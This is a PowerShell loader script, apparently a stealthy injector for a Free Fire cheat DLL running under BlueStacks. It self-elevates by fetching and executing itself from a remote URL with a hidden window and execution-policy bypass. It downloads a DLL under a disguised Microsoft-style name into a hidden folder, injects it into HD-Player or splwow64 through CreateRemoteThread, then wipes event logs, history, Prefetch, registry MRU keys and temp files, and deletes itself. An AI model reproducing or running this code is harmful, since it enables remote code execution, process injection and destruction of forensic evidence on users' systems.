# ============================================================
# dugduy.ps1 - Enhanced Stealth Version
# ============================================================

# === 1. Self-Elevate to Administrator ===
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://raw.githubusercontent.com/getx796-Harem/cmdFreefire/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# === 2. Configuration ===
$url = "https://github.com/potae112/Cmdfreefire/releases/download/v1.0/dllfreefire.dll"
$fakeName = "mscories.dll"
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
$dllPath = Join-Path $workDir $fakeName
$targetProcess = "HD-Player"

# === 3. Prepare Working Directory (Hidden) ===
if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue }
New-Item -ItemType Directory -Path $workDir -Force | Out-Null
attrib +h +s $workDir

# === 4. Download DLL Silently ===
$ProgressPreference = 'SilentlyContinue'
Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue
attrib +h $dllPath

# === 5. C# Code for DLL Injection ===
$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public class Injector {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public static void Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
    }
}
"@

# === 6. Inject into BlueStacks ===
if (Test-Path $dllPath) {
    $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
    if (!$proc) {
        # Try multiple BlueStacks paths
        $possiblePaths = @(
            "C:\Program Files\BlueStacks_nxt\HD-Player.exe",
            "C:\Program Files\BlueStacks\HD-Player.exe",
            "C:\ProgramData\BlueStacks_nxt\HD-Player.exe"
        )
        foreach ($path in $possiblePaths) {
            if (Test-Path $path) {
                Start-Process $path
                break
            }
        }
        Start-Sleep -Seconds 8
        $proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
    }

    if ($proc) {
        Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
        [Injector]::Inject($proc.Id, $dllPath)
    }
}

# === 7. Fallback Injection (splwow64) ===
if (!$proc) {
    $fallbackProcess = "splwow64"
    $proc = Get-Process -Name $fallbackProcess -ErrorAction SilentlyContinue
    if (!$proc) {
        Start-Process "splwow64.exe" -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 3
        $proc = Get-Process -Name $fallbackProcess -ErrorAction SilentlyContinue
    }
    if ($proc) {
        Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
        [Injector]::Inject($proc.Id, $dllPath)
    }
}

# === 8. Deep Cleanup & Anti-Forensics ===
Start-Sleep -Seconds 5

# 8.1 Clear PowerShell History
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
$histPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $histPath) { 
    try { Set-Content -Path $histPath -Value "" -Force -ErrorAction SilentlyContinue } catch {}
}
Clear-History -ErrorAction SilentlyContinue

# 8.2 Clear Recent Files
$recentPath = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
if (Test-Path $recentPath) {
    Get-ChildItem -Path $recentPath -Force -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
}

# 8.3 Clear Jump Lists
$jumpListPaths = @(
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"),
    (Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations")
)
foreach ($path in $jumpListPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Force -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# 8.4 Clear Prefetch
$prefetchPath = "C:\Windows\Prefetch"
for ($i = 0; $i -lt 3; $i++) {
    Start-Sleep -Seconds 1
    if (Test-Path $prefetchPath) {
        Get-ChildItem -Path $prefetchPath -Filter "*.pf" -Force -ErrorAction SilentlyContinue | 
            Where-Object { $_.Name -like "*HD-PLAYER*" -or $_.Name -like "*SPLWOW64*" -or $_.Name -like "*MSCORIES*" -or $_.Name -like "*POWERSHELL*" } |
            Remove-Item -Force -ErrorAction SilentlyContinue
    }
}

# 8.5 Clear INetCache
$ieCache = Join-Path $env:LOCALAPPDATA "Microsoft\Windows\INetCache"
if (Test-Path $ieCache) {
    Get-ChildItem -Path $ieCache -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
}

# 8.6 Clear Temp
$tempDir = $env:TEMP
Get-ChildItem -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue

# 8.7 Clear Registry MRU and MuiCache
$mruKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKCU:\Software\Microsoft\Windows\ShellNoRoam\BagMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
    "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
)
foreach ($key in $mruKeys) {
    if (Test-Path $key) {
        if ($key -like "*MuiCache*") {
            Get-Item -Path $key -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Property | Where-Object { $_ -like "*$fakeName*" -or $_ -like "*.tmp*" -or $_ -like "*powershell*" } | ForEach-Object {
                Remove-ItemProperty -Path $key -Name $_ -Force -ErrorAction SilentlyContinue
            }
        } else {
            Remove-Item -Path $key -Recurse -Force -ErrorAction SilentlyContinue
            New-Item -Path $key -Force -ErrorAction SilentlyContinue | Out-Null
        }
    }
}

# 8.8 Clear Event Logs (Admin)
$logNames = @("Application", "Security", "System", "Microsoft-Windows-PowerShell/Operational")
foreach ($logName in $logNames) {
    try {
        wevtutil cl $logName 2>$null
    } catch {}
}

# 8.9 Delete Working Directory
Start-Sleep -Seconds 2
if (Test-Path $workDir) { 
    try { 
        Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue 
    } catch {}
}

# 8.10 Delete script itself
if ($PSCommandPath -and (Test-Path $PSCommandPath)) { 
    Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue 
}

# 8.11 Force Garbage Collection
[GC]::Collect()
Start-Sleep -Seconds 2

exit